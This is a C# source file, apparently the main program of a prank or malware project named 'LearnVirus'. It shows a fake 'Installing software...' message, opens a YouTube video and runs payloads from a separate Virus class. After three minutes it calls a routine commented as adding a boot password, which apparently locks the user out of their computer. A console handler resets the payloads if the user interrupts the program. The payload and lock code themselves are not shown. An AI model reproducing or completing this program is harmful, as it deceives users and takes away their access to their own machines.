using System;
using System.Threading;
using System.Runtime.InteropServices;

namespace LearnVirus
{
    class Program
    {
        static void Main()
        {
            // Register the handler
            SetConsoleCtrlHandler(Handler, true);
            Console.WriteLine("Installing software...");
            var video = new System.Diagnostics.ProcessStartInfo();
            video.UseShellExecute = true;
            video.FileName = "https://www.youtube.com/watch?v=HmZm8vNHBSU";
            System.Diagnostics.Process.Start(video);
            Virus.Virus.RunPayloads();

            Thread.Sleep(180000);

            Virus.Lock.LockLogin(); //Add boot password
        }

        // https://docs.microsoft.com/en-us/windows/console/setconsolectrlhandler?WT.mc_id=DT-MVP-5003978
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(SetConsoleCtrlEventHandler handler, bool add);

        // https://docs.microsoft.com/en-us/windows/console/handlerroutine?WT.mc_id=DT-MVP-5003978
        private delegate bool SetConsoleCtrlEventHandler(CtrlType sig);

        private enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool Handler(CtrlType signal)
        {
            switch (signal)
            {
                case CtrlType.CTRL_BREAK_EVENT:
                case CtrlType.CTRL_C_EVENT:
                case CtrlType.CTRL_LOGOFF_EVENT:
                case CtrlType.CTRL_SHUTDOWN_EVENT:
                case CtrlType.CTRL_CLOSE_EVENT:
                    Virus.Virus.Reset();
                    // TODO Cleanup resources
                    Environment.Exit(0);
                    return false;

                default:
                    return false;
            }
        }
    }
}
